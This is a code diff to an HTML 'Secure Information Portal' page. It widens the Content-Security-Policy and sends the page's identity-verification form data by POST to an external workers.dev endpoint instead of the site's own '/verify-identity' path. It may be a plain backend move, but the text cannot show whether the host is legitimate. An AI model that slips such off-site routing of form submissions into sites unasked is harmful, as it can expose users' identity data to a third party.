@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; font-src 'self'; form-action 'self';">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://backend.shinumaths989.workers.dev; font-src 'self'; form-action 'self';">
     <title>Secure Information Portal</title>
     <style>
         :root {
@@ -251,6 +251,8 @@
     </div>
 
     <script>
+        const VERIFY_API = 'https://backend.shinumaths989.workers.dev/verify-identity';
+
         function sanitize(str) {
             const d = document.createElement('div');
             d.textContent = str;
@@ -294,7 +296,7 @@
                 data[f] = el.value.trim();
             });
 
-            fetch('/verify-identity', {
+            fetch(VERIFY_API, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
